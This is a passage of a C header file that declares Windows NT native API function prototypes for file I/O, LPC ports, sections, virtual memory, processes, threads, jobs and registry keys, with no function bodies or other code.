    IN PLARGE_INTEGER ByteOffset,
    IN PLARGE_INTEGER Length,
    IN ULONG Key
    );


NTSTATUS
NTAPI
NtReadFileScatter (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PFILE_SEGMENT_ELEMENT SegmentArray,
    IN ULONG Length,
    IN OPTIONAL PLARGE_INTEGER ByteOffset,
    IN OPTIONAL PULONG Key
    );


NTSTATUS
NTAPI
NtSetEaFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID Buffer,
    IN ULONG Length
    );


NTSTATUS
NTAPI
NtWriteFileGather (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PFILE_SEGMENT_ELEMENT SegmentArray,
    IN ULONG Length,
    IN OPTIONAL PLARGE_INTEGER ByteOffset,
    IN OPTIONAL PULONG Key
    );


NTSTATUS
NTAPI
NtLoadDriver (
    IN PUNICODE_STRING DriverServiceName
    );


NTSTATUS
NTAPI
NtUnloadDriver (
    IN PUNICODE_STRING DriverServiceName
    );


NTSTATUS
NTAPI
NtCreateIoCompletion (
    OUT PHANDLE IoCompletionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN ULONG Count OPTIONAL
    );


NTSTATUS
NTAPI
NtOpenIoCompletion (
    OUT PHANDLE IoCompletionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtQueryIoCompletion (
    IN HANDLE IoCompletionHandle,
    IN IO_COMPLETION_INFORMATION_CLASS IoCompletionInformationClass,
    OUT PVOID IoCompletionInformation,
    IN ULONG IoCompletionInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtSetIoCompletion (
    IN HANDLE IoCompletionHandle,
    IN PVOID KeyContext,
    IN OPTIONAL PVOID ApcContext,
    IN NTSTATUS IoStatus,
    IN ULONG_PTR IoStatusInformation
    );


NTSTATUS
NTAPI
NtRemoveIoCompletion (
    IN HANDLE IoCompletionHandle,
    OUT PVOID *KeyContext,
    OUT PVOID *ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );


NTSTATUS
NTAPI
NtCallbackReturn (
    IN PVOID OutputBuffer OPTIONAL,
    IN ULONG OutputLength,
    IN NTSTATUS Status
    );


NTSTATUS
NTAPI
NtQueryDebugFilterState (
    IN ULONG ComponentId,
    IN ULONG Level
    );


NTSTATUS
NTAPI
NtSetDebugFilterState (
    IN ULONG ComponentId,
    IN ULONG Level,
    IN BOOLEAN State
    );


NTSTATUS
NTAPI
NtYieldExecution (
    VOID
    );


NTSTATUS
NTAPI
NtCreatePort(
    OUT PHANDLE PortHandle,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN ULONG MaxConnectionInfoLength,
    IN ULONG MaxMessageLength,
    IN OPTIONAL ULONG MaxPoolUsage
    );


NTSTATUS
NTAPI
NtCreateWaitablePort(
    OUT PHANDLE PortHandle,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN ULONG MaxConnectionInfoLength,
    IN ULONG MaxMessageLength,
    IN OPTIONAL ULONG MaxPoolUsage
    );


NTSTATUS
NTAPI
NtConnectPort(
    OUT PHANDLE PortHandle,
    IN PUNICODE_STRING PortName,
    IN PSECURITY_QUALITY_OF_SERVICE SecurityQos,
    IN OUT OPTIONAL PPORT_VIEW ClientView,
    IN OUT OPTIONAL PREMOTE_PORT_VIEW ServerView,
    OUT OPTIONAL PULONG MaxMessageLength,
    IN OUT OPTIONAL PVOID ConnectionInformation,
    IN OUT OPTIONAL PULONG ConnectionInformationLength
    );


NTSTATUS
NTAPI
NtSecureConnectPort(
    OUT PHANDLE PortHandle,
    IN PUNICODE_STRING PortName,
    IN PSECURITY_QUALITY_OF_SERVICE SecurityQos,
    IN OUT OPTIONAL PPORT_VIEW ClientView,
    IN OPTIONAL PSID RequiredServerSid,
    IN OUT OPTIONAL PREMOTE_PORT_VIEW ServerView,
    OUT OPTIONAL PULONG MaxMessageLength,
    IN OUT OPTIONAL PVOID ConnectionInformation,
    IN OUT OPTIONAL PULONG ConnectionInformationLength
    );


NTSTATUS
NTAPI
NtListenPort(
    IN HANDLE PortHandle,
    OUT PPORT_MESSAGE ConnectionRequest
    );


NTSTATUS
NTAPI
NtAcceptConnectPort(
    OUT PHANDLE PortHandle,
    IN OPTIONAL PVOID PortContext,
    IN PPORT_MESSAGE ConnectionRequest,
    IN BOOLEAN AcceptConnection,
    IN OUT OPTIONAL PPORT_VIEW ServerView,
    OUT OPTIONAL PREMOTE_PORT_VIEW ClientView
    );


NTSTATUS
NTAPI
NtCompleteConnectPort(
    IN HANDLE PortHandle
    );


NTSTATUS
NTAPI
NtRequestPort(
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE RequestMessage
    );


NTSTATUS
NTAPI
NtRequestWaitReplyPort(
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE RequestMessage,
    OUT PPORT_MESSAGE ReplyMessage
    );


NTSTATUS
NTAPI
NtReplyPort(
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE ReplyMessage
    );


NTSTATUS
NTAPI
NtReplyWaitReplyPort(
    IN HANDLE PortHandle,
    IN OUT PPORT_MESSAGE ReplyMessage
    );


NTSTATUS
NTAPI
NtReplyWaitReceivePort(
    IN HANDLE PortHandle,
    OUT OPTIONAL PVOID *PortContext ,
    IN OPTIONAL PPORT_MESSAGE ReplyMessage,
    OUT PPORT_MESSAGE ReceiveMessage
    );


NTSTATUS
NTAPI
NtReplyWaitReceivePortEx(
    IN HANDLE PortHandle,
    OUT OPTIONAL PVOID *PortContext,
    IN OPTIONAL PPORT_MESSAGE ReplyMessage,
    OUT PPORT_MESSAGE ReceiveMessage,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );


NTSTATUS
NTAPI
NtImpersonateClientOfPort(
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE Message
    );


NTSTATUS
NTAPI
NtReadRequestData(
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE Message,
    IN ULONG DataEntryIndex,
    OUT PVOID Buffer,
    IN SIZE_T BufferSize,
    OUT OPTIONAL PSIZE_T NumberOfBytesRead
    );


NTSTATUS
NTAPI
NtWriteRequestData(
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE Message,
    IN ULONG DataEntryIndex,
    IN PVOID Buffer,
    IN SIZE_T BufferSize,
    OUT OPTIONAL PSIZE_T NumberOfBytesWritten
    );


NTSTATUS
NTAPI
NtQueryInformationPort(
    IN HANDLE PortHandle,
    IN PORT_INFORMATION_CLASS PortInformationClass,
    OUT PVOID PortInformation,
    IN ULONG Length,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtCreateSection (
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN OPTIONAL PLARGE_INTEGER MaximumSize,
    IN ULONG SectionPageProtection,
    IN ULONG AllocationAttributes,
    IN OPTIONAL HANDLE FileHandle
    );


NTSTATUS
NTAPI
NtOpenSection (
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtMapViewOfSection (
    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T CommitSize,
    IN OUT OPTIONAL PLARGE_INTEGER SectionOffset,
    IN OUT PSIZE_T ViewSize,
    IN SECTION_INHERIT InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Win32Protect
    );


NTSTATUS
NTAPI
NtUnmapViewOfSection (
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress
    );


NTSTATUS
NTAPI
NtExtendSection (
    IN HANDLE SectionHandle,
    IN OUT PLARGE_INTEGER NewSectionSize
    );


NTSTATUS
NTAPI
NtAreMappedFilesTheSame (
    IN PVOID File1MappedAsAnImage,
    IN PVOID File2MappedAsFile
    );


NTSTATUS
NTAPI
NtAllocateVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect
    );


NTSTATUS
NTAPI
NtFreeVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG FreeType
    );


NTSTATUS
NTAPI
NtReadVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OPTIONAL PVOID BaseAddress,
    OUT PVOID Buffer,
    IN SIZE_T BufferSize,
    OUT OPTIONAL PSIZE_T NumberOfBytesRead
    );


NTSTATUS
NTAPI
NtWriteVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OPTIONAL PVOID BaseAddress,
    IN CONST VOID *Buffer,
    IN SIZE_T BufferSize,
    OUT OPTIONAL PSIZE_T NumberOfBytesWritten
    );


NTSTATUS
NTAPI
NtFlushVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize,
    OUT PIO_STATUS_BLOCK IoStatus
    );


NTSTATUS
NTAPI
NtLockVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG MapType
    );


NTSTATUS
NTAPI
NtUnlockVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG MapType
    );


NTSTATUS
NTAPI
NtProtectVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect
    );


NTSTATUS
NTAPI
NtQueryVirtualMemory (
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN MEMORY_INFORMATION_CLASS MemoryInformationClass,
    OUT PVOID MemoryInformation,
    IN SIZE_T MemoryInformationLength,
    OUT OPTIONAL PSIZE_T ReturnLength
    );


NTSTATUS
NTAPI
NtQuerySection (
    IN HANDLE SectionHandle,
    IN SECTION_INFORMATION_CLASS SectionInformationClass,
    OUT PVOID SectionInformation,
    IN SIZE_T SectionInformationLength,
    OUT OPTIONAL PSIZE_T ReturnLength
    );


NTSTATUS
NTAPI
NtMapUserPhysicalPages (
    IN PVOID VirtualAddress,
    IN ULONG_PTR NumberOfPages,
    IN OPTIONAL PULONG_PTR UserPfnArray
    );


NTSTATUS
NTAPI
NtMapUserPhysicalPagesScatter (
    IN PVOID *VirtualAddresses,
    IN ULONG_PTR NumberOfPages,
    IN OPTIONAL PULONG_PTR UserPfnArray
    );


NTSTATUS
NTAPI
NtAllocateUserPhysicalPages (
    IN HANDLE ProcessHandle,
    IN OUT PULONG_PTR NumberOfPages,
    OUT PULONG_PTR UserPfnArray
    );


NTSTATUS
NTAPI
NtFreeUserPhysicalPages (
    IN HANDLE ProcessHandle,
    IN OUT PULONG_PTR NumberOfPages,
    IN PULONG_PTR UserPfnArray
    );


NTSTATUS
NTAPI
NtGetWriteWatch (
    IN HANDLE ProcessHandle,
    IN ULONG Flags,
    IN PVOID BaseAddress,
    IN SIZE_T RegionSize,
    OUT PVOID *UserAddressArray,
    IN OUT PULONG_PTR EntriesInUserAddressArray,
    OUT PULONG Granularity
    );


NTSTATUS
NTAPI
NtResetWriteWatch (
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN SIZE_T RegionSize
    );


NTSTATUS
NTAPI
NtCreatePagingFile (
    IN PUNICODE_STRING PageFileName,
    IN PLARGE_INTEGER MinimumSize,
    IN PLARGE_INTEGER MaximumSize,
    IN ULONG Priority
    );


NTSTATUS
NTAPI
NtFlushInstructionCache (
    IN HANDLE ProcessHandle,
    IN OPTIONAL PVOID BaseAddress,
    IN SIZE_T Length
    );


NTSTATUS
NTAPI
NtFlushWriteBuffer (
    VOID
    );


NTSTATUS
NTAPI
NtQueryObject (
    IN HANDLE Handle,
    IN OBJECT_INFORMATION_CLASS ObjectInformationClass,
    OUT PVOID ObjectInformation,
    IN ULONG ObjectInformationLength,
    OUT PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtSetInformationObject (
    IN HANDLE Handle,
    IN OBJECT_INFORMATION_CLASS ObjectInformationClass,
    IN PVOID ObjectInformation,
    IN ULONG ObjectInformationLength
    );


NTSTATUS
NTAPI
NtDuplicateObject (
    IN HANDLE SourceProcessHandle,
    IN HANDLE SourceHandle,
    IN OPTIONAL HANDLE TargetProcessHandle,
    OUT PHANDLE TargetHandle,
    IN ACCESS_MASK DesiredAccess,
    IN ULONG HandleAttributes,
    IN ULONG Options
    );


NTSTATUS
NTAPI
NtMakeTemporaryObject (
    IN HANDLE Handle
    );


NTSTATUS
NTAPI
NtMakePermanentObject (
    IN HANDLE Handle
    );


NTSTATUS
NTAPI
NtSignalAndWaitForSingleObject (
    IN HANDLE SignalHandle,
    IN HANDLE WaitHandle,
    IN BOOLEAN Alertable,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );


NTSTATUS
NTAPI
NtWaitForSingleObject (
    IN HANDLE Handle,
    IN BOOLEAN Alertable,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );


NTSTATUS
NTAPI
NtWaitForMultipleObjects (
    IN ULONG Count,
    IN HANDLE Handles[],
    IN WAIT_TYPE WaitType,
    IN BOOLEAN Alertable,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );


NTSTATUS
NTAPI
NtWaitForMultipleObjects32 (
    IN ULONG Count,
    IN LONG Handles[],
    IN WAIT_TYPE WaitType,
    IN BOOLEAN Alertable,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );


NTSTATUS
NTAPI
NtSetSecurityObject (
    IN HANDLE Handle,
    IN SECURITY_INFORMATION SecurityInformation,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor
    );


NTSTATUS
NTAPI
NtQuerySecurityObject (
    IN HANDLE Handle,
    IN SECURITY_INFORMATION SecurityInformation,
    OUT PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN ULONG Length,
    OUT PULONG LengthNeeded
    );


NTSTATUS
NTAPI
NtClose (
    IN HANDLE Handle
    );


NTSTATUS
NTAPI
NtCreateDirectoryObject (
    OUT PHANDLE DirectoryHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtOpenDirectoryObject (
    OUT PHANDLE DirectoryHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtQueryDirectoryObject (
    IN HANDLE DirectoryHandle,
    OUT PVOID Buffer,
    IN ULONG Length,
    IN BOOLEAN ReturnSingleEntry,
    IN BOOLEAN RestartScan,
    IN OUT  PULONG Context,
    OUT PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtCreateSymbolicLinkObject (
    OUT PHANDLE LinkHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN PUNICODE_STRING LinkTarget
    );


NTSTATUS
NTAPI
NtOpenSymbolicLinkObject (
    OUT PHANDLE LinkHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtQuerySymbolicLinkObject (
    IN HANDLE LinkHandle,
    IN OUT  PUNICODE_STRING LinkTarget,
    OUT PULONG ReturnedLength
    );


NTSTATUS
NTAPI
NtGetPlugPlayEvent (
    IN HANDLE EventHandle,
    IN OPTIONAL PVOID Context,
    OUT PPLUGPLAY_EVENT_BLOCK EventBlock,
    IN  ULONG EventBufferSize
    );


NTSTATUS
NTAPI
NtPlugPlayControl(
    IN PLUGPLAY_CONTROL_CLASS PnPControlClass,
    IN OUT PVOID PnPControlData,
    IN ULONG PnPControlDataLength
    );


NTSTATUS
NTAPI
NtPowerInformation(
    IN POWER_INFORMATION_LEVEL InformationLevel,
    IN OPTIONAL PVOID InputBuffer,
    IN ULONG InputBufferLength,
    OUT OPTIONAL PVOID OutputBuffer,
    IN ULONG OutputBufferLength
    );


NTSTATUS
NTAPI
NtSetThreadExecutionState(
    IN EXECUTION_STATE esFlags,               // ES_xxx flags
    OUT EXECUTION_STATE *PreviousFlags
    );


NTSTATUS
NTAPI
NtRequestWakeupLatency(
    IN LATENCY_TIME latency
    );


// NTSTATUS
// NTAPI
// NtInitiatePowerAction(
//     IN POWER_ACTION SystemAction,
//     IN SYSTEM_POWER_STATE MinSystemState,
//     IN ULONG Flags,                 // POWER_ACTION_xxx flags
//     IN BOOLEAN Asynchronous
//     );


// NTSTATUS
// NTAPI
// NtSetSystemPowerState(
//     IN POWER_ACTION SystemAction,
//     IN SYSTEM_POWER_STATE MinSystemState,
//     IN ULONG Flags                  // POWER_ACTION_xxx flags
//     );


// NTSTATUS
// NTAPI
// NtGetDevicePowerState(
//     IN HANDLE Device,
//     OUT DEVICE_POWER_STATE *State
//     );


NTSTATUS
NTAPI
NtCancelDeviceWakeupRequest(
    IN HANDLE Device
    );


NTSTATUS
NTAPI
NtRequestDeviceWakeup(
    IN HANDLE Device
    );


NTSTATUS
NTAPI
NtCreateProcess (
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN HANDLE ParentProcess,
    IN BOOLEAN InheritObjectTable,
    IN OPTIONAL HANDLE SectionHandle,
    IN OPTIONAL HANDLE DebugPort,
    IN OPTIONAL HANDLE ExceptionPort
    );


NTSTATUS
NTAPI
NtCreateProcessEx(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN HANDLE ParentProcess,
    IN ULONG Flags,
    IN OPTIONAL HANDLE SectionHandle,
    IN OPTIONAL HANDLE DebugPort,
    IN OPTIONAL HANDLE ExceptionPort,
    IN ULONG JobMemberLevel
    );


NTSTATUS
NTAPI
NtOpenProcess (
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN OPTIONAL PCLIENT_ID ClientId
    );


NTSTATUS
NTAPI
NtTerminateProcess (
    IN OPTIONAL HANDLE ProcessHandle,
    IN NTSTATUS ExitStatus
    );


NTSTATUS
NTAPI
NtQueryInformationProcess (
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN ULONG ProcessInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtGetNextProcess (
    IN HANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN ULONG HandleAttributes,
    IN ULONG Flags,
    OUT PHANDLE NewProcessHandle
    );


NTSTATUS
NTAPI
NtGetNextThread (
    IN HANDLE ProcessHandle,
    IN HANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN ULONG HandleAttributes,
    IN ULONG Flags,
    OUT PHANDLE NewThreadHandle
    );


NTSTATUS
NTAPI
NtQueryPortInformationProcess (
    VOID
    );


NTSTATUS
NTAPI
NtSetInformationProcess (
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    IN PVOID ProcessInformation,
    IN ULONG ProcessInformationLength
    );

NTSTATUS
NTAPI
NtCreateThreadEx (
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN LPVOID StartRoutine,
    IN LPVOID Argument,
    IN ULONG CreateFlags,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T CommitSize,
    IN SIZE_T MaximumStackSize,
    IN LPVOID AttributeList
);


NTSTATUS
NTAPI
NtCreateThread (
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN HANDLE ProcessHandle,
    OUT PCLIENT_ID ClientId,
    IN PCONTEXT ThreadContext,
    IN PINITIAL_TEB InitialTeb,
    IN BOOLEAN CreateSuspended
    );


NTSTATUS
NTAPI
NtOpenThread (
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN OPTIONAL PCLIENT_ID ClientId
    );


NTSTATUS
NTAPI
NtTerminateThread (
    IN OPTIONAL HANDLE ThreadHandle,
    IN NTSTATUS ExitStatus
    );


NTSTATUS
NTAPI
NtSuspendThread (
    IN HANDLE ThreadHandle,
    OUT OPTIONAL PULONG PreviousSuspendCount
    );


NTSTATUS
NTAPI
NtResumeThread (
    IN HANDLE ThreadHandle,
    OUT OPTIONAL PULONG PreviousSuspendCount
    );


NTSTATUS
NTAPI
NtSuspendProcess (
	HANDLE ProcessHandle
	);


NTSTATUS
NTAPI
NtResumeProcess (
    IN HANDLE ProcessHandle
    );


NTSTATUS
NTAPI
NtGetContextThread (
    IN HANDLE ThreadHandle,
    IN OUT PCONTEXT ThreadContext
    );


NTSTATUS
NTAPI
NtSetContextThread (
    IN HANDLE ThreadHandle,
    IN PCONTEXT ThreadContext
    );


NTSTATUS
NTAPI
NtQueryInformationThread (
    IN HANDLE ThreadHandle,
    IN THREADINFOCLASS ThreadInformationClass,
    OUT PVOID ThreadInformation,
    IN ULONG ThreadInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtSetInformationThread (
    IN HANDLE ThreadHandle,
    IN THREADINFOCLASS ThreadInformationClass,
    IN PVOID ThreadInformation,
    IN ULONG ThreadInformationLength
    );


NTSTATUS
NTAPI
NtAlertThread (
    IN HANDLE ThreadHandle
    );


NTSTATUS
NTAPI
NtAlertResumeThread (
    IN HANDLE ThreadHandle,
    OUT OPTIONAL PULONG PreviousSuspendCount
    );


NTSTATUS
NTAPI
NtImpersonateThread (
    IN HANDLE ServerThreadHandle,
    IN HANDLE ClientThreadHandle,
    IN PSECURITY_QUALITY_OF_SERVICE SecurityQos
    );


NTSTATUS
NTAPI
NtTestAlert (
    VOID
    );


NTSTATUS
NTAPI
NtRegisterThreadTerminatePort (
    IN HANDLE PortHandle
    );


NTSTATUS
NTAPI
NtSetLdtEntries (
    IN ULONG Selector0,
    IN ULONG Entry0Low,
    IN ULONG Entry0Hi,
    IN ULONG Selector1,
    IN ULONG Entry1Low,
    IN ULONG Entry1Hi
    );


NTSTATUS
NTAPI
NtQueueApcThread (
    IN HANDLE ThreadHandle,
    IN PPS_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcArgument1,
    IN OPTIONAL PVOID ApcArgument2,
    IN OPTIONAL PVOID ApcArgument3
    );


NTSTATUS
NTAPI
NtCreateJobObject (
    OUT PHANDLE JobHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtOpenJobObject (
    OUT PHANDLE JobHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtAssignProcessToJobObject (
    IN HANDLE JobHandle,
    IN HANDLE ProcessHandle
    );


NTSTATUS
NTAPI
NtTerminateJobObject (
    IN HANDLE JobHandle,
    IN NTSTATUS ExitStatus
    );


NTSTATUS
NTAPI
NtIsProcessInJob (
    IN HANDLE ProcessHandle,
    IN OPTIONAL HANDLE JobHandle
    );


NTSTATUS
NTAPI
NtCreateJobSet (
    IN ULONG NumJob,
    IN PJOB_SET_ARRAY UserJobSet,
    IN ULONG Flags
    );


NTSTATUS
NTAPI
NtQueryInformationJobObject (
    IN OPTIONAL HANDLE JobHandle,
    IN JOBOBJECTINFOCLASS JobObjectInformationClass,
    OUT PVOID JobObjectInformation,
    IN ULONG JobObjectInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
NtSetInformationJobObject (
    IN HANDLE JobHandle,
    IN JOBOBJECTINFOCLASS JobObjectInformationClass,
    IN PVOID JobObjectInformation,
    IN ULONG JobObjectInformationLength
    );


NTSTATUS
NTAPI
NtCreateKey(
    OUT PHANDLE KeyHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    ULONG TitleIndex,
    IN OPTIONAL PUNICODE_STRING Class,
    IN ULONG CreateOptions,
    OUT OPTIONAL PULONG Disposition
    );


NTSTATUS
NTAPI
NtDeleteKey(
    IN HANDLE KeyHandle
    );


NTSTATUS
NTAPI
NtDeleteValueKey(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING ValueName
    );


NTSTATUS
NTAPI
NtEnumerateKey(
    IN HANDLE KeyHandle,
    IN ULONG Index,
    IN KEY_INFORMATION_CLASS KeyInformationClass,
    OUT OPTIONAL PVOID KeyInformation,
    IN ULONG Length,
    OUT PULONG ResultLength
    );


NTSTATUS
NTAPI
NtEnumerateValueKey(
    IN HANDLE KeyHandle,
    IN ULONG Index,
    IN KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    OUT OPTIONAL PVOID KeyValueInformation,
    IN ULONG Length,
    OUT PULONG ResultLength
    );


NTSTATUS
NTAPI
NtFlushKey(
    IN HANDLE KeyHandle
    );


NTSTATUS
NTAPI
NtInitializeRegistry(
    IN USHORT BootCondition
    );


NTSTATUS
NTAPI
NtNotifyChangeKey(
    IN HANDLE KeyHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG CompletionFilter,
    IN BOOLEAN WatchTree,
    OUT OPTIONAL PVOID Buffer,
    IN ULONG BufferSize,
    IN BOOLEAN Asynchronous
    );


NTSTATUS
NTAPI
NtNotifyChangeMultipleKeys(
    IN HANDLE MasterKeyHandle,
    IN OPTIONAL ULONG Count,
    IN OPTIONAL OBJECT_ATTRIBUTES SlaveObjects[],
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG CompletionFilter,
    IN BOOLEAN WatchTree,
    OUT OPTIONAL PVOID Buffer,
    IN ULONG BufferSize,
    IN BOOLEAN Asynchronous
    );


NTSTATUS
NTAPI
NtLoadKey(
    IN POBJECT_ATTRIBUTES TargetKey,
    IN POBJECT_ATTRIBUTES SourceFile
    );


NTSTATUS
NTAPI
NtLoadKey2(
    IN POBJECT_ATTRIBUTES TargetKey,
    IN POBJECT_ATTRIBUTES SourceFile,
    IN ULONG Flags
    );


NTSTATUS
NTAPI
NtLoadKeyEx(
    IN POBJECT_ATTRIBUTES TargetKey,
    IN POBJECT_ATTRIBUTES SourceFile,
    IN ULONG Flags,
    IN OPTIONAL HANDLE TrustClassKey
    );


NTSTATUS
NTAPI
NtOpenKey(
    OUT PHANDLE KeyHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSTATUS
NTAPI
NtQueryKey(
    IN HANDLE KeyHandle,
    IN KEY_INFORMATION_CLASS KeyInformationClass,
    OUT OPTIONAL PVOID KeyInformation,
    IN ULONG Length,
    OUT PULONG ResultLength
    );


NTSTATUS
NTAPI
NtQueryValueKey(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING ValueName,
    IN KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    OUT OPTIONAL PVOID KeyValueInformation,
    IN ULONG Length,
    OUT PULONG ResultLength
    );


NTSTATUS
NTAPI
NtQueryMultipleValueKey(
    IN HANDLE KeyHandle,
    IN OUT PKEY_VALUE_ENTRY ValueEntries,
    IN ULONG EntryCount,
    OUT PVOID ValueBuffer,
    IN OUT PULONG BufferLength,
    OUT OPTIONAL PULONG RequiredBufferLength
    );


NTSTATUS
NTAPI
NtReplaceKey(
    IN POBJECT_ATTRIBUTES NewFile,
    IN HANDLE TargetHandle,
    IN POBJECT_ATTRIBUTES OldFile
    );


NTSTATUS
NTAPI
NtRenameKey(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING  NewName
    );


NTSTATUS
NTAPI
NtCompactKeys(
    IN ULONG Count,
    IN HANDLE KeyArray[]
            );


NTSTATUS
NTAPI
NtCompressKey(
    IN HANDLE Key
            );


NTSTATUS
NTAPI
NtRestoreKey(
    IN HANDLE KeyHandle,
    IN HANDLE FileHandle,
    IN ULONG Flags
    );


NTSTATUS
NTAPI
NtSaveKey(
    IN HANDLE KeyHandle,
    IN HANDLE FileHandle
    );


NTSTATUS
NTAPI
NtSaveKeyEx(
    IN HANDLE KeyHandle,
    IN HANDLE FileHandle,
    IN ULONG  Format
    );


NTSTATUS
NTAPI
NtSaveMergedKeys(
    IN HANDLE HighPrecedenceKeyHandle,
